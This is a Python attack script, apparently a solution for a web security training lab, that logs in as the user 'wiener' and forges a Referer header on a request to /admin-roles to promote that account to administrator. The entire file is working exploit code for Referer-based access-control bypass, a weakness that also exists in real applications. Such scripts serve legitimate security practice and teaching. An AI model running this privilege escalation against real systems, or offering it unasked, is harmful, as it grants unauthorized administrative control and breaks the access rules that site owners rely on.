import requests
import sys

def upgrade_user(url, session, username):
    print(f"(+) Upgrading user {username}")
    upgrade_url = url + "/admin-roles?username=wiener&action=upgrade"
    upgrade = session.get(upgrade_url, headers={"referer": url + "/admin"} , allow_redirects=False)
    if upgrade.status_code == 302:
        print(f"(+) Successfully upgraded user {username} to Admin.")
    else:
        print(f"(-) Could not upgrade user {username}.")
        print("(-) Exiting...")
        sys.exit(1)



def login(url, session, username, password):
    print(f"(+) Logging in as user {username}...")
    login_url = url + "/login"
    data = {"username": username, "password": password}
    response = session.post(login_url, data=data)
    res = response.text
    if "Log out" in response.text:
        print("(+) Successfully logged in!")
    else:
        print("(+) Could not login!")
        print("(+) Exiting...")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        sys.exit(1)
    
    print("(+) Starting the script...")
    url = sys.argv[1]
    session = requests.Session()
    login(url, session, "Wiener", "peter")
    upgrade_user(url, session, "Wiener")



if __name__ == "__main__":
    main()